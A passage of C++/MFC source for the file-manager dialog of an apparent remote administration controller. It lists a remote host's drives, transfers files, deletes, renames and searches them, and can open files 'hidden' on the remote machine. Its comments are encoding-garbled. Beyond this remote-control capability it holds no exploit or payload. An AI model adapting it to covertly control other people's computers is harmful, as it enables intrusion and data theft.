// FileManagerDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Client.h"
#include "FileManagerDlg.h"
#include "FileTransferModeDlg.h"
#include "Include\InputDlg.h"
#include <Shlwapi.h>
#pragma comment(lib,"shlwapi.lib")

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

static UINT indicators[] = {
    ID_SEPARATOR,           // status line indicator
    ID_SEPARATOR,
    ID_SEPARATOR
};

#define MAKEINT64(low, high) ((unsigned __int64)(((DWORD)(low)) | ((unsigned __int64)((DWORD)(high))) << 32))

#define WM_SHOW_MSG (WM_USER+101)
#define WM_SHOW_DLG (WM_USER+103)
/////////////////////////////////////////////////////////////////////////////
// CFileManagerDlg dialog

CFileManagerDlg::CFileManagerDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
    : CDialog(CFileManagerDlg::IDD, pParent)
{
    m_strHost = GetRemoteIP(pContext->m_Socket).c_str();
    //{{AFX_DATA_INIT(CFileManagerDlg)
    //}}AFX_DATA_INIT
    // ��ʼ��Ӧ�ô�������ݰ���СΪ0
    m_iocpServer	= pIOCPServer;
    m_pContext		= pContext;

    // ����Զ���������б�
    memset(m_bRemoteDriveList, 0, sizeof(m_bRemoteDriveList));
    memcpy(m_bRemoteDriveList, m_pContext->m_DeCompressionBuffer.GetBuffer(1), m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1);

    // ��ȡ IP
    sockaddr_in  sockAddr;
    memset(&sockAddr, 0, sizeof(sockAddr));
    int nSockAddrLen = sizeof(sockAddr);
    BOOL bResult = getpeername(m_pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
    m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";

    //����ϵͳͼ��
    SHFILEINFO	sfi;
    HIMAGELIST hImageList;
    // ����ϵͳ��ͼ���б�
    hImageList = (HIMAGELIST)SHGetFileInfo
                 (
                     (LPCTSTR)_T(""),
                     0,
                     &sfi,
                     sizeof(SHFILEINFO),
                     SHGFI_LARGEICON | SHGFI_SYSICONINDEX
                 );
    m_pImageList_Large = CImageList::FromHandle(hImageList);

    // ����ϵͳСͼ���б�
    hImageList = (HIMAGELIST)SHGetFileInfo
                 (
                     (LPCTSTR)_T(""),
                     0,
                     &sfi,
                     sizeof(SHFILEINFO),
                     SHGFI_SMALLICON | SHGFI_SYSICONINDEX
                 );
    m_pImageList_Small = CImageList::FromHandle(hImageList);

    // ���ô���ͼ��
    m_hIcon = (HICON)::LoadImage(::AfxGetInstanceHandle(),MAKEINTRESOURCE(IDI_ICOFILE), IMAGE_ICON, 20, 20, 0);

    // ��ʼ�����䷽ʽ
    m_nTransferMode = TRANSFER_MODE_NORMAL;
    m_nOperatingFileLength = 0;
    m_nCounter = 0;

    m_bIsStop = false;
    // �Ƿ�OnClose
    m_bOnClose = FALSE;
}


void CFileManagerDlg::DoDataExchange(CDataExchange* pDX)
{
    CDialog::DoDataExchange(pDX);
    //{{AFX_DATA_MAP(CFileManagerDlg)
    DDX_Control(pDX, IDC_LIST_REMOTE_SEARCH, m_list_remote_search);
    DDX_Control(pDX, IDC_REMOTE_PATH, m_Remote_Directory_ComboBox);
    DDX_Control(pDX, IDC_LOCAL_PATH, m_Local_Directory_ComboBox);
    DDX_Control(pDX, IDC_LIST_REMOTE, m_list_remote);
    DDX_Control(pDX, IDC_LIST_LOCAL, m_list_local);
    //}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CFileManagerDlg, CDialog)
    //{{AFX_MSG_MAP(CFileManagerDlg)
    ON_WM_QUERYDRAGICON()
    ON_WM_SIZE()
    ON_NOTIFY(NM_DBLCLK, IDC_LIST_LOCAL, OnDblclkListLocal)
    ON_NOTIFY(LVN_BEGINDRAG, IDC_LIST_LOCAL, OnBegindragListLocal)
    ON_NOTIFY(LVN_BEGINDRAG, IDC_LIST_REMOTE, OnBegindragListRemote)
    ON_WM_MOUSEMOVE()
    ON_WM_LBUTTONUP()
    ON_WM_CLOSE()
    ON_NOTIFY(NM_DBLCLK, IDC_LIST_REMOTE, OnDblclkListRemote)
    ON_COMMAND(IDT_LOCAL_PREV, OnLocalPrev)
    ON_COMMAND(IDT_REMOTE_PREV, OnRemotePrev)
    ON_COMMAND(IDR_LOCAL_VIEW, OnLocalView)
    ON_COMMAND(IDM_LOCAL_LIST, OnLocalList)
    ON_COMMAND(IDM_LOCAL_REPORT, OnLocalReport)
    ON_COMMAND(IDM_LOCAL_BIGICON, OnLocalBigicon)
    ON_COMMAND(IDM_LOCAL_SMALLICON, OnLocalSmallicon)
    ON_COMMAND(IDM_REMOTE_BIGICON, OnRemoteBigicon)
    ON_COMMAND(IDM_REMOTE_LIST, OnRemoteList)
    ON_COMMAND(IDM_REMOTE_REPORT, OnRemoteReport)
    ON_COMMAND(IDM_REMOTE_SMALLICON, OnRemoteSmallicon)
    ON_COMMAND(IDR_REMOTE_VIEW, OnRemoteView)
    ON_UPDATE_COMMAND_UI(IDT_LOCAL_STOP, OnUpdateLocalStop)
    ON_UPDATE_COMMAND_UI(IDT_REMOTE_STOP, OnUpdateRemoteStop)
    ON_UPDATE_COMMAND_UI(IDT_LOCAL_PREV, OnUpdateLocalPrev)
    ON_UPDATE_COMMAND_UI(IDT_REMOTE_PREV, OnUpdateRemotePrev)
    ON_UPDATE_COMMAND_UI(IDT_LOCAL_COPY, OnUpdateLocalCopy)
    ON_UPDATE_COMMAND_UI(IDT_REMOTE_COPY, OnUpdateRemoteCopy)
    ON_UPDATE_COMMAND_UI(IDT_REMOTE_DELETE, OnUpdateRemoteDelete)
    ON_UPDATE_COMMAND_UI(IDT_REMOTE_NEWFOLDER, OnUpdateRemoteNewfolder)
    ON_UPDATE_COMMAND_UI(IDT_LOCAL_DELETE, OnUpdateLocalDelete)
    ON_UPDATE_COMMAND_UI(IDT_LOCAL_NEWFOLDER, OnUpdateLocalNewfolder)
    ON_COMMAND(IDT_REMOTE_COPY, OnRemoteCopy)
    ON_COMMAND(IDT_LOCAL_COPY, OnLocalCopy)
    ON_COMMAND(IDT_LOCAL_DELETE, OnLocalDelete)
    ON_COMMAND(IDT_REMOTE_DELETE, OnRemoteDelete)
    ON_COMMAND(IDT_REMOTE_STOP, OnRemoteStop)
    ON_COMMAND(IDT_LOCAL_STOP, OnLocalStop)
    ON_COMMAND(IDT_LOCAL_NEWFOLDER, OnLocalNewfolder)
    ON_COMMAND(IDT_REMOTE_NEWFOLDER, OnRemoteNewfolder)
    ON_COMMAND(IDM_TRANSFER, OnTransfer)
    ON_COMMAND(IDM_RENAME, OnRename)
    ON_NOTIFY(LVN_ENDLABELEDIT, IDC_LIST_LOCAL, OnEndlabeleditListLocal)
    ON_NOTIFY(LVN_ENDLABELEDIT, IDC_LIST_REMOTE, OnEndlabeleditListRemote)
    ON_COMMAND(IDM_DELETE, OnDelete)
    ON_COMMAND(IDM_NEWFOLDER, OnNewfolder)
    ON_COMMAND(IDM_REFRESH, OnRefresh)
    ON_COMMAND(IDM_LOCAL_OPEN, OnLocalOpen)
    ON_COMMAND(IDM_REMOTE_OPEN_SHOW, OnRemoteOpenShow)
    ON_COMMAND(IDM_REMOTE_OPEN_HIDE, OnRemoteOpenHide)
    ON_NOTIFY(NM_RCLICK, IDC_LIST_LOCAL, OnRclickListLocal)
    ON_NOTIFY(NM_RCLICK, IDC_LIST_REMOTE, OnRclickListRemote)
    ON_MESSAGE(WM_SHOW_MSG,&OnShowMessage)
    ON_MESSAGE(WM_SHOW_DLG,&OnShowDlg)
    ON_COMMAND(ID_SEARCH_RESULT, OnSearchResult)
    ON_COMMAND(ID_SEARCH_START, OnSearchStart)
    ON_COMMAND(ID_SEARCH_STOP, OnSearchStop)
    ON_NOTIFY(NM_RCLICK, IDC_LIST_REMOTE_SEARCH, OnRclickListRemoteSearch)
    ON_COMMAND(ID_MENUITEM_OPEN_FILEPATH, OnMenuitemOpenFilepath)
    ON_COMMAND(ID_MENUITEM_MOVE, OnMenuitemMove)
    ON_COMMAND(ID_MENUITEM_COPY, OnMenuitemCopy)
    ON_COMMAND(ID_MENUITEM_PASTE, OnMenuitemPaste)
    //}}AFX_MSG_MAP
    ON_XTP_CREATECONTROL()

    ON_BN_CLICKED(ID_SEARCH_SUBFOLDER, OnCheckSubfolder)


END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CFileManagerDlg message handlers
void CFileManagerDlg::OnReceiveComplete()
{
    switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0]) {
    case TOKEN_FILE_LIST: // �ļ��б�
        FixedRemoteFileList
        (
            m_pContext->m_DeCompressionBuffer.GetBuffer(0),
            m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1
        );
        break;
    case TOKEN_FILE_SIZE: // �����ļ�ʱ�ĵ�һ�����ݰ����ļ���С�����ļ���
        CreateLocalRecvFile();
        break;
    case TOKEN_FILE_DATA: // �ļ�����
        WriteLocalRecvFile();
        break;
    case TOKEN_TRANSFER_FINISH: // �������
        EndLocalRecvFile();
        break;
    case TOKEN_CREATEFOLDER_FINISH:
        GetRemoteFileList(".");
        break;
    case TOKEN_DELETE_FINISH:
        EndRemoteDeleteFile();
        break;
    case TOKEN_MOVE_FINISH:
        EndRemoteMoveFile();
        break;
    case TOKEN_GET_TRANSFER_MODE:
        SendTransferMode();
        break;
    case TOKEN_DATA_CONTINUE:
        SendFileData();
        break;
    case TOKEN_RENAME_FINISH:
        // ˢ��Զ���ļ��б�
        GetRemoteFileList(".");
        break;
    case TOKEN_SEARCH_FILE_LIST:
        FixedRemoteSearchFileList
        (
            m_pContext->m_DeCompressionBuffer.GetBuffer(0),
            m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1
        );
        break;
    case TOKEN_SEARCH_FILE_FINISH:
        m_list_remote_search.EnableWindow(TRUE);
        EnableSearchButtn(TRUE);
        break;
    default:
        break;
    }
}


BOOL CFileManagerDlg::OnInitDialog()
{
    CDialog::OnInitDialog();

    // TODO: Add extra initialization here
    SetIcon(m_hIcon, TRUE);			// Set big icon
    SetIcon(m_hIcon, FALSE);		// Set small icon

    // ���ñ���
    CString str;
    str.Format(_T("[%s - %s]  �ļ�����"), m_strHost,m_IPAddress);
    SetWindowText(str);
    //����������
    DWORD dwStyle = WS_CHILD | WS_VISIBLE | CBRS_TOOLTIPS | CBRS_TOOLTIPS | CBRS_FLYBY;

    VERIFY(m_wndToolBar_Local.CreateToolBar(dwStyle, this));
    VERIFY(m_wndToolBar_Local.LoadToolBar(IDR_TOOLBAR1));
    m_wndToolBar_Local.GetImageManager()->SetIcons(IDR_TOOLBAR1,IDB_TOOLBAR_ENABLE);


    VERIFY(m_wndToolBar_Remote.CreateToolBar(dwStyle, this));
    VERIFY(m_wndToolBar_Remote.LoadToolBar(IDR_TOOLBAR2));
    m_wndToolBar_Remote.GetImageManager()->SetIcons(IDR_TOOLBAR2,IDB_TOOLBAR_ENABLE);

    VERIFY(m_wndToolBar_Search.CreateToolBar(dwStyle, this));
    VERIFY(m_wndToolBar_Search.LoadToolBar(IDR_TOOLBAR3));
    m_wndToolBar_Search.GetImageManager()->SetIcons(IDR_TOOLBAR3,IDB_TOOLBAR_SEARCH);


    // �����������������
    m_wndToolBar_Search.GetControls()->FindControl(ID_SEARCH_TEXT)->SetStyle(xtpButtonCaption);
    m_wndToolBar_Search.GetControls()->FindControl(ID_SEARCH_RESULT)->SetStyle(xtpButtonIconAndCaption);

    EnableSearchButtn(TRUE);

    // ��������������״̬��
    if (!m_wndStatusBar.Create(this) ||!m_wndStatusBar.SetIndicators(indicators,sizeof(indicators)/sizeof(UINT))) {
        TRACE0(_T("δ�ܴ���״̬��\n"));
        return -1;
    }
    m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);
    m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, 120);
    m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 50);
    RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //��ʾ״̬��
    RECT	rect;
    m_wndStatusBar.GetItemRect(1, &rect);

    // ����������
    m_ProgressCtrl = new CXTPProgressCtrl;
    m_ProgressCtrl->Create(PBS_SMOOTH | WS_VISIBLE, rect, &m_wndStatusBar, 1);
    m_ProgressCtrl->SetTheme(xtpControlThemeOfficeXP);
    m_ProgressCtrl->SetRange(0, 100);           //���ý�������Χ
    m_ProgressCtrl->SetPos(20);                 //���ý�������ǰλ��

    // Ϊ�б���ͼ����ImageList
    m_list_local.SetImageList(m_pImageList_Large, LVSIL_NORMAL);
    m_list_local.SetImageList(m_pImageList_Small, LVSIL_SMALL);

    m_list_remote.SetImageList(m_pImageList_Large, LVSIL_NORMAL);
    m_list_remote.SetImageList(m_pImageList_Small, LVSIL_SMALL);

    m_list_remote_search.SetImageList(m_pImageList_Large, LVSIL_NORMAL);
    m_list_remote_search.SetImageList(m_pImageList_Small, LVSIL_SMALL);

    //��������list��ͷ
    m_list_remote_search.InsertColumn(0, "�������: ·��",  LVCFMT_LEFT, 400);
    m_list_remote_search.InsertColumn(1, "��С", LVCFMT_LEFT, 100);
    m_list_remote_search.InsertColumn(2, "�޸�����", LVCFMT_LEFT, 100);

    //���ó�ʼ����
    m_bDragging = false;
    m_nDragIndex = -1;
    m_nDropIndex = -1;

    // ��ʼ��COM�� ���ñ���·��ListBOX�Զ����
    CoInitialize(NULL);
    SHAutoComplete(GetDlgItem(IDC_LOCAL_PATH)->GetWindow(GW_CHILD)->m_hWnd, SHACF_FILESYSTEM);

    //��ʾ������
    MoveToolBar();


    // ��������
    m_Remote_Directory_ComboBox.SetTheme(xtpControlThemeOfficeXP);
    m_Local_Directory_ComboBox.SetTheme(xtpControlThemeOfficeXP);

// 	HWND hWndHeader = m_list_local.GetDlgItem(0)->GetSafeHwnd();
// 	m_headerL.SubclassWindow(hWndHeader);
//     m_headerL.SetTheme(xtpControlThemeOffice2003);
//
//     hWndHeader = m_list_remote.GetDlgItem(0)->GetSafeHwnd();
// 	m_headerR.SubclassWindow(hWndHeader);
//     m_headerR.SetTheme(xtpControlThemeOffice2003);
//
// 	hWndHeader = m_list_remote_search.GetDlgItem(0)->GetSafeHwnd();
// 	m_headerS.SubclassWindow(hWndHeader);
//     m_headerS.SetTheme(xtpControlThemeOffice2003);


    // ��ʾ�������б�
    FixedLocalDriveList();
    FixedRemoteDriveList();

    return TRUE;  // return TRUE unless you set the focus to a control
    // EXCEPTION: OCX Property Pages should return FALSE
}

// ͨ���ļ�����ȡICO ���
int	GetIconIndex(LPCTSTR lpFileName, DWORD dwFileAttributes)
{
    SHFILEINFO	sfi;
    if (dwFileAttributes == INVALID_FILE_ATTRIBUTES)
        dwFileAttributes = FILE_ATTRIBUTE_NORMAL;
    else
        dwFileAttributes |= FILE_ATTRIBUTE_NORMAL;

    SHGetFileInfo
    (
        lpFileName,
        dwFileAttributes,
        &sfi,
        sizeof(SHFILEINFO),
        SHGFI_SYSICONINDEX | SHGFI_USEFILEATTRIBUTES
    );

    return sfi.iIcon;
}

// ��ʾ������
void CFileManagerDlg::MoveToolBar()
{
    RECT	rect;
    GetClientRect(&rect);
    m_wndToolBar_Local.MoveWindow( rect.right - 230, 0, 230, 36);
    m_wndToolBar_Remote.MoveWindow( rect.right - 230, rect.bottom / 2 - 27, 230, 36);
    m_wndToolBar_Search.MoveWindow(0, rect.bottom - 54, rect.right, 35);
}

void CFileManagerDlg::OnSize(UINT nType, int cx, int cy)
{
    CDialog::OnSize(nType, cx, cy);

    // TODO: Add your message handler code here
    // ״̬����û�д���
    if (m_wndStatusBar.m_hWnd == NULL)
        return;
    // ��λ״̬��
    RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //��ʾ������
    RECT	rect;
    m_wndStatusBar.GetItemRect(1, &rect);
    m_ProgressCtrl->MoveWindow(&rect);



    GetDlgItem(IDC_LIST_LOCAL)->MoveWindow(0, 36, cx, (cy - 130) / 2);
    GetDlgItem(IDC_LIST_REMOTE)->MoveWindow(0, (cy / 2) + 12, cx, (cy - 130) / 2);
    GetDlgItem(IDC_LIST_REMOTE_SEARCH)->MoveWindow(0, (cy / 2) + 12, cx, (cy - 130) / 2);
    GetDlgItem(IDC_STATIC_REMOTE)->MoveWindow(25, cy / 2 - 15, 30, 14);
    GetDlgItem(IDC_REMOTE_PATH)->MoveWindow(59, (cy / 2) - 20, cx - 300, 12);
    GetDlgItem(IDC_LOCAL_PATH)->MoveWindow(59,  8, cx - 300, 12);

    //��ʾ������
    MoveToolBar();
}

// ��ʾ�����������б�
void CFileManagerDlg::FixedLocalDriveList()
{
    // �ؽ�list
    m_list_local.DeleteAllItems();
    while(m_list_local.DeleteColumn(0) != 0);
    m_list_local.InsertColumn(0, "����",  LVCFMT_LEFT, 200);
    m_list_local.InsertColumn(1, "����", LVCFMT_LEFT, 100);
    m_list_local.InsertColumn(2, "�ܴ�С", LVCFMT_LEFT, 100);
    m_list_local.InsertColumn(3, "���ÿռ�", LVCFMT_LEFT, 115);

    // pDrive ��ȡ��������
    char	DriveString[256];
    char	*pDrive = NULL;

    GetLogicalDriveStrings(sizeof(DriveString), DriveString);
    pDrive = DriveString;

    //
    unsigned __int64	HDAmount = 0;
    unsigned __int64	HDFreeSpace = 0;
    unsigned long		AmntMB = 0; // �ܴ�С
    unsigned long		FreeMB = 0; // ʣ��ռ�

    for (int i = 0; *pDrive != '\0'; i++, pDrive += lstrlen(pDrive) + 1) {
        if (pDrive[0] != 'A' && pDrive[0] != 'B' && GetDiskFreeSpaceEx(pDrive, (PULARGE_INTEGER)&HDFreeSpace, (PULARGE_INTEGER)&HDAmount, NULL)) {
            AmntMB = (unsigned long)(HDAmount / 1024 / 1024);
            FreeMB = (unsigned long)(HDFreeSpace / 1024 / 1024);
        } else {
            AmntMB = 0;
            FreeMB = 0;
        }


        int	nIconIndex = -1;

        if (pDrive[i] == 'A' || pDrive[i] == 'B') {
            nIconIndex = 6;
        } else {
            switch (GetDriveType(pDrive)) {
            case DRIVE_REMOVABLE:
                nIconIndex = 7;
                break;
            case DRIVE_FIXED:
                nIconIndex = 8;
                break;
            case DRIVE_REMOTE:
                nIconIndex = 9;
                break;
            case DRIVE_CDROM:
                nIconIndex = 11;
                break;
            default:
                nIconIndex = 8;
                break;
            }
        }

        int	nItem = m_list_local.InsertItem(i, pDrive, nIconIndex);

        m_list_local.SetItemData(nItem, 1);

        SHFILEINFO	sfi;
        SHGetFileInfo(pDrive, FILE_ATTRIBUTE_NORMAL, &sfi,sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
        m_list_local.SetItemText(nItem, 1, sfi.szTypeName);

        CString	str;
        str.Format(_T("%10.1f GB"), (float)AmntMB / 1024);
        m_list_local.SetItemText(nItem, 2, str);
        str.Format(_T("%10.1f GB"), (float)FreeMB / 1024);
        m_list_local.SetItemText(nItem, 3, str);

    }
    // ���ñ��ص�ǰ·��
    m_Local_Path = "";
    // ���CListBox�е�����
    m_Local_Directory_ComboBox.ResetContent();

    strShowText.Format(_T("����: װ��Ŀ¼ %s ���"), m_Local_Path);
    PostMessage(WM_SHOW_MSG, 0, 0);
    //ShowMessage(_T("����: װ��Ŀ¼ %s ���"), m_Local_Path);
}

// ˫��m_list_local
void CFileManagerDlg::OnDblclkListLocal(NMHDR* pNMHDR, LRESULT* pResult)
{
    // TODO: Add your control notification handler code here
    if (m_list_local.GetSelectedCount() == 0 || m_list_local.GetItemData(m_list_local.GetSelectionMark()) != 1)
        return;

    FixedLocalFileList();
    *pResult = 0;
}

// DWORD64 GetFolderSize(LPCTSTR szPath, DWORD *dwFiles, DWORD *dwFolders)
// {
// 	TCHAR szFileFilter[512];
// 	TCHAR szFilePath[512];
// 	HANDLE hFind = NULL;
// 	WIN32_FIND_DATA fileinfo;
// 	DWORD64    dwSize = 0;
//
// 	strcpy(szFilePath,szPath);
// 	strcat(szFilePath,"\\");
// 	strcpy(szFileFilter,szFilePath);
// 	strcat(szFileFilter,"*.*");
//
// 	hFind = FindFirstFile(szFileFilter,&fileinfo);
// 	do
// 	{
// 		if(fileinfo.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
// 		{
// 			if (!strcmp(fileinfo.cFileName,".") || !strcmp(fileinfo.cFileName,".."))
// 			{
// 				//Do nothing for "." and ".." folders
// 			}
// 			else
// 			{
// 				TCHAR sztmp[512];
// 				strcpy(sztmp,szFilePath);
// 				strcat(sztmp,fileinfo.cFileName);
// 				dwSize = dwSize + GetFolderSize(sztmp, NULL, NULL);
// 				if(dwFolders != NULL)
// 				{
// 					++(*dwFolders);
// 				}
// 			}
// 		}
// 		else
// 		{
// 			if(dwFiles != NULL)
// 			{
// 				++(*dwFiles);
// 			}
// 		}
//
//
// 		dwSize += fileinfo.nFileSizeLow;
//
// 	}while(FindNextFile(hFind,&fileinfo));
//
// 	FindClose(hFind);
// 	return dwSize;
// }

// ��ʾ�����ļ��б�
void CFileManagerDlg::FixedLocalFileList(CString directory)
{
    // �����ָ��Ŀ¼ ��鿴ѡ�е�����
    if (directory.GetLength() == 0) {
        int	nItem = m_list_local.GetSelectionMark();
        // �����ѡ�еģ���Ŀ¼
        if (nItem != -1) {
            if (m_list_local.GetItemData(nItem) == 1) {
                directory = m_list_local.GetItemText(nItem, 0);
            }
        } else {
            // ����Ͽ���õ�·��
            m_Local_Directory_ComboBox.GetWindowText(m_Local_Path);
        }
    }

    // ����� .. �򷵻ظ�Ŀ¼
    if (directory == "..") {
        m_Local_Path = GetParentDirectory(m_Local_Path);
    }
    // ˢ�µ�ǰ��
    else if (directory != ".") {
        m_Local_Path += directory;
        if(m_Local_Path.Right(1) != "\\")
            m_Local_Path += "\\";
    }


    // ���������ĸ�Ŀ¼,���ش����б�
    if (m_Local_Path.GetLength() == 0) {
        FixedLocalDriveList();
        return;
    }

    // Combox����뵱ǰ·��
    m_Local_Directory_ComboBox.InsertString(0, m_Local_Path);
    m_Local_Directory_ComboBox.SetCurSel(0);

    // �ؽ�����
    m_list_local.DeleteAllItems();
    while(m_list_local.DeleteColumn(0) != 0);
    m_list_local.InsertColumn(0, "����",  LVCFMT_LEFT, 200);
    m_list_local.InsertColumn(1, "��С", LVCFMT_LEFT, 100);
    m_list_local.InsertColumn(2, "����", LVCFMT_LEFT, 100);
    m_list_local.InsertColumn(3, "�޸�����", LVCFMT_LEFT, 115);

    int			nItemIndex = 0;
    m_list_local.SetItemData
    (
        m_list_local.InsertItem(nItemIndex++, "..", GetIconIndex(NULL, FILE_ATTRIBUTE_DIRECTORY)),
        1
    );

    // i Ϊ 0 ʱ��Ŀ¼��i Ϊ 1ʱ���ļ�
    for (int i = 0; i < 2; i++) {
        CFileFind	file;
        BOOL		bContinue;
        bContinue = file.FindFile(m_Local_Path + "*.*");
        while (bContinue) {
            bContinue = file.FindNextFile();
            if (file.IsDots())
                continue;
            bool bIsInsert = !file.IsDirectory() == i;

            if (!bIsInsert)
                continue;

            int nItem = m_list_local.InsertItem(nItemIndex++, file.GetFileName(),
                                                GetIconIndex(file.GetFileName(), GetFileAttributes(file.GetFilePath())));
            m_list_local.SetItemData(nItem,	file.IsDirectory());

            SHFILEINFO	sfi;
            SHGetFileInfo(file.GetFileName(), FILE_ATTRIBUTE_NORMAL, &sfi,sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
            m_list_local.SetItemText(nItem, 2, sfi.szTypeName);
            // ��С
            CString str;
            str.Format(_T("%10d KB"), file.GetLength() / 1024 + (file.GetLength() % 1024 ? 1 : 0));
            m_list_local.SetItemText(nItem, 1, str);
            //����޸�ʱ��
            CTime time;
            file.GetLastWriteTime(time);
            m_list_local.SetItemText(nItem, 3, time.Format(_T("%Y-%m-%d %H:%M")));
        }
    }

    strShowText.Format(_T("����: װ��Ŀ¼ %s ���"), m_Local_Path);
    PostMessage(WM_SHOW_MSG,0,0);
    //ShowMessage(_T("����: װ��Ŀ¼ %s ���"), m_Local_Path);
}

// ��ק�ļ�ʱ�������
void CFileManagerDlg::DropItemOnList(CListCtrl* pDragList, CListCtrl* pDropList)
{
    //This routine performs the actual drop of the item dragged.
    //It simply grabs the info from the Drag list (pDragList)
    // and puts that info into the list dropped on (pDropList).
    //Send:	pDragList = pointer to CListCtrl we dragged from,
    //		pDropList = pointer to CListCtrl we are dropping on.
    //Return: nothing.

    // Variables
    // Unhilight the drop target

    if(pDragList == pDropList) { //we are return
        return;
    } //EO if(pDragList...


    pDropList->SetItemState(m_nDropIndex, 0, LVIS_DROPHILITED);

    if ((CWnd *)pDropList == &m_list_local) {
        OnRemoteCopy();
    } else if ((CWnd *)pDropList == &m_list_remote) {
        OnLocalCopy();
    } else {
        // ������
        return;
    }
    // ����
    m_nDropIndex = -1;
}

// The system calls this to obtain the cursor to display while the user drags
// the minimized window.
HCURSOR CFileManagerDlg::OnQueryDragIcon()
{
    return (HCURSOR) m_hIcon;
}

// �ӱ���list��ק
void CFileManagerDlg::OnBegindragListLocal(NMHDR* pNMHDR, LRESULT* pResult)
{
    NM_LISTVIEW* pNMListView = (NM_LISTVIEW*)pNMHDR;
    // TODO: Add your control notification handler code here
    // Save the index of the item being dragged in m_nDragIndex
    // This will be used later for retrieving the info dragged
    m_nDragIndex = pNMListView->iItem;

    if (!m_list_local.GetItemText(m_nDragIndex, 0).Compare(_T("..")))
        return;

    //We will call delete later (in LButtonUp) to clean this up

    if(m_list_local.GetSelectedCount() > 1) //more than 1 item in list is selected
        m_hCursor = AfxGetApp()->LoadCursor(IDC_MUTI_DRAG);
    else
        m_hCursor = AfxGetApp()->LoadCursor(IDC_DRAG);

    ASSERT(m_hCursor); //make sure it was created
    // Change the cursor to the drag image
    // (still must perform DragMove() in OnMouseMove() to show it moving)

    // Set dragging flag and others
    m_bDragging = TRUE;	//we are in a drag and drop operation
    m_nDropIndex = -1;	//we don't have a drop index yet
    m_pDragList = &m_list_local; //make note of which list we are dragging from
    m_pDropWnd = &m_list_local;	//at present the drag list is the drop list

    // Capture all mouse messages
    SetCapture();
    *pResult = 0;
}
// ��Զ��list��ק
void CFileManagerDlg::OnBegindragListRemote(NMHDR* pNMHDR, LRESULT* pResult)
{
    NM_LISTVIEW* pNMListView = (NM_LISTVIEW*)pNMHDR;
    // TODO: Add your control notification handler code here
    // Save the index of the item being dragged in m_nDragIndex
    // This will be used later for retrieving the info dragged
    m_nDragIndex = pNMListView->iItem;
    if (!m_list_local.GetItemText(m_nDragIndex, 0).Compare(_T("..")))
        return;


    //We will call delete later (in LButtonUp) to clean this up

    if(m_list_remote.GetSelectedCount() > 1) //more than 1 item in list is selected
        m_hCursor = AfxGetApp()->LoadCursor(IDC_MUTI_DRAG);
    else
        m_hCursor = AfxGetApp()->LoadCursor(IDC_DRAG);

    ASSERT(m_hCursor); //make sure it was created
    // Change the cursor to the drag image
    // (still must perform DragMove() in OnMouseMove() to show it moving)

    //// Set dragging flag and others
    m_bDragging = TRUE;	//we are in a drag and drop operation
    m_nDropIndex = -1;	//we don't have a drop index yet
    m_pDragList = &m_list_remote; //make note of which list we are dragging from
    m_pDropWnd = &m_list_remote;	//at present the drag list is the drop list

    // Capture all mouse messages
    SetCapture ();
    *pResult = 0;
}

// ����ƶ�
void CFileManagerDlg::OnMouseMove(UINT nFlags, CPoint point)
{
    // TODO: Add your message handler code here and/or call default
    // While the mouse is moving, this routine is called.
    // This routine will redraw the drag image at the present
    // mouse location to display the dragging.
    // Also, while over a CListCtrl, this routine will highlight
    // the item we are hovering over.

    //// If we are in a drag/drop procedure (m_bDragging is true)
    if (m_bDragging) {
        //SetClassLong(m_list_local.m_hWnd, GCL_HCURSOR, (LONG)AfxGetApp()->LoadCursor(IDC_DRAG));

        //// Move the drag image
        CPoint pt(point);	//get our current mouse coordinates
        ClientToScreen(&pt); //convert to screen coordinates

        //// Get the CWnd pointer of the window that is under the mouse cursor
        CWnd* pDropWnd = WindowFromPoint (pt);

        ASSERT(pDropWnd); //make sure we have a window

        //// If we drag outside current window we need to adjust the highlights displayed
        if (pDropWnd != m_pDropWnd) {
            if (m_nDropIndex != -1) { //If we drag over the CListCtrl header, turn off the hover highlight
                TRACE(_T("m_nDropIndex is -1\n"));
                CListCtrl* pList = (CListCtrl*)m_pDropWnd;
                VERIFY (pList->SetItemState (m_nDropIndex, 0, LVIS_DROPHILITED));
                // redraw item
                VERIFY (pList->RedrawItems (m_nDropIndex, m_nDropIndex));
                pList->UpdateWindow ();
                m_nDropIndex = -1;
            }
        }

        // Save current window pointer as the CListCtrl we are dropping onto
        m_pDropWnd = pDropWnd;

        // Convert from screen coordinates to drop target client coordinates
        pDropWnd->ScreenToClient(&pt);

        //If we are hovering over a CListCtrl we need to adjust the highlights
        if(pDropWnd->IsKindOf(RUNTIME_CLASS (CListCtrl))) {
            //Note that we can drop here
            SetCursor(m_hCursor);

            if (m_pDropWnd->m_hWnd == m_pDragList->m_hWnd)
                return;

            UINT uFlags;
            CListCtrl* pList = (CListCtrl*)pDropWnd;

            // Turn off hilight for previous drop target
            pList->SetItemState (m_nDropIndex, 0, LVIS_DROPHILITED);
            // Redraw previous item
            pList->RedrawItems (m_nDropIndex, m_nDropIndex);

            // Get the item that is below cursor
            m_nDropIndex = ((CListCtrl*)pDropWnd)->HitTest(pt, &uFlags);
            if (m_nDropIndex != -1) {
                // Highlight it
                pList->SetItemState(m_nDropIndex, LVIS_DROPHILITED, LVIS_DROPHILITED);
                // Redraw item
